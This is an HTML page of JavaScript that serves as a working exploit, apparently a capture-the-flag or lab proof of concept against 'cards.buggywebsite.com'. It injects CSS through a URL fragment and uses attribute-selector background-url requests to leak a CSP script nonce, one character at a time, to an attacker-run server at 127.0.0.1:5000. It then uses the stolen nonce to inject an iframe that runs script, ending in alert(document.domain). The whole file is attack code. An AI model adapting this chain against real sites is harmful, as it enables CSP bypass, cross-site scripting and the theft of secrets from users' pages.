<html>
    <script>
        var chars = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"];
        var target_url = "https://cards.buggywebsite.com/popup.html#==";
        var target = open(target_url);
        var x1 = new XMLHttpRequest();
        var x2 = new XMLHttpRequest();

        // Wait a couple seconds for the target page to load since we can't observe the onload event of a tab cross origin
        // Start by getting the current value of the nonce string (this will be an empty string to start)
        var x = setTimeout(get_current_nonce, 3000);
        
        // Once current nonce string is retrieved, get the next character of the nonce
        // Then, check if the full nonce string has been retrieved
        x1.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                get_nonce_char(x1.responseText);
                x2.open("GET", "http://127.0.0.1:5000/iscomplete", true);
                x2.send();
            }
        };

        // If the full nonce value has been retrieved, perform the final exploit
        // Else, continue retrieving the nonce
        x2.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                if (x2.responseText == "true"){
                    exploit();
                }
                else{
                    get_current_nonce();
                }
            }
        };

        function get_current_nonce(){
            x1.open("GET", "http://127.0.0.1:5000/nonce", true);
            x1.send();
        }

        // Perform style injection to get single char of nonce string
        // If the current nonce value stored is correct, trigger a lookup to the complete endpoint
        function get_nonce_char(current_nonce_value){
            var exploit_url = target_url + "<style> * { display: block; }";
            for (var i = 0; i < chars.length; i++){
                nonce_char = chars[i];
                nonce_string = current_nonce_value + nonce_char;
                exploit_url = exploit_url + ` *[nonce^='${nonce_string}'] { background:url('http://127.0.0.1:5000/add/${nonce_char}') }`;
            }
            exploit_url = exploit_url + ` *[nonce='${current_nonce_value}'] { background:url('http://127.0.0.1:5000/complete') }`;
            exploit_url = exploit_url + "</style>";
            target.location  = encodeURI(exploit_url);
        }
        
        // Nonce has been recovered, perform final exploit
        function exploit(){
            var x3 = new XMLHttpRequest();
            x3.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var nonce = x3.responseText;
                    var payload = target_url + `<iframe srcdoc='<script nonce="${nonce}">alert(document.domain)</` + "script>' >";
                    target.location = payload;
                }
            };
            x3.open("GET", "http://127.0.0.1:5000/nonce", true);
            x3.send();
        }
        
    </script>
</html>